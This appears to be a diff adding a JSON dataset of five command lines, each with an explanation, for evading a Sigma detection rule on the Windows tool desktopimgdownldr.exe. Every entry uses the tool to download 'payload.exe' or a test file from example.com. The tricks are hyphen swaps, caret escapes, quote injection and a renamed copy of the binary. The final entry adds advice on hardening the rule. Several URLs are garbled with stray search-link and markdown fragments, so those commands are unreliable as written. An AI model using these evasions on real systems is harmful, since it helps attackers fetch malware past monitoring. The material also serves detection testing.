@@ -1,0 +1,22 @@
+[
+  {
+    "output": "desktopimgdownldr.exe -lockscreenurl:[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)",
+    "explanation": "The Sigma rule explicitly checks for the string '/lockscreenurl:http'. Since many native Windows command-line utilities accept a hyphen ('-') interchangeably with a forward slash ('/') for arguments, using '-lockscreenurl:' completely bypasses the substring match requirement."
+  },
+  {
+    "output": "cmd.exe /c \"desktopimgdownldr.exe /lockscreenurl:h^t^t^p://[example.com/payload.exe]()\"",
+    "explanation": "The Windows command shell interprets the caret symbol (^) as an escape character. When executed through cmd.exe, the raw process creation logs capture the command line string with the carets included, breaking the contiguous '/lockscreenurl:http' signature while successfully running the download utility."
+  },
+  {
+    "output": "desktopimgdownldr.exe /lockscreenurl:\"h\"\"ttp://[example.com/payload.exe]()\"",
+    "explanation": "Injecting empty double quotes inside the protocol string disrupts the contiguous string match monitored by the SIEM logic. The internal Windows command-line parser strips these quotes before passing the arguments to the binary, ensuring functional execution while evading static signature matches."
+  },
+  {
+    "output": "cmd.exe /c copy C:\\Windows\\System32\\desktopimgdownldr.exe C:\\Temp\\bg_update.exe && C:\\Temp\\bg_update.exe /lockscreenurl:[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)",
+    "explanation": "The detection logic relies on a strict boolean condition where the process Image OR ParentImage must end with '\\desktopimgdownldr.exe'. By copying the utility to an arbitrary directory with a renamed executable file, the rule's path-matching condition evaluates to false."
+  },
+  {
+    "output": "copy %windir%\\system32\\desktopimgdownldr.exe %temp%\\dl.exe && %temp%\\dl.exe /lockscreenurl:https://example.com/test.txt /dest:%temp%\\test.txt",
+    "explanation": "This simulated command demonstrates conceptual bypasses by highlighting logical weaknesses in the detection rule. First, the rule's 'Image|endswith' condition relies strictly on the executable's name. Copying or renaming the binary (e.g., to dl.exe) evades this check. Second, the rule requires the 'ParentImage' to also be '\\desktopimgdownldr.exe'. Executing the tool directly from a standard shell (like cmd.exe or powershell.exe) results in a different parent process, meaning the condition fails. From a defensive perspective, this detection can be improved by looking for the 'OriginalFileName' PE metadata field instead of relying solely on the file path, and by relaxing or removing the strict ParentImage requirement."
+  }
+]
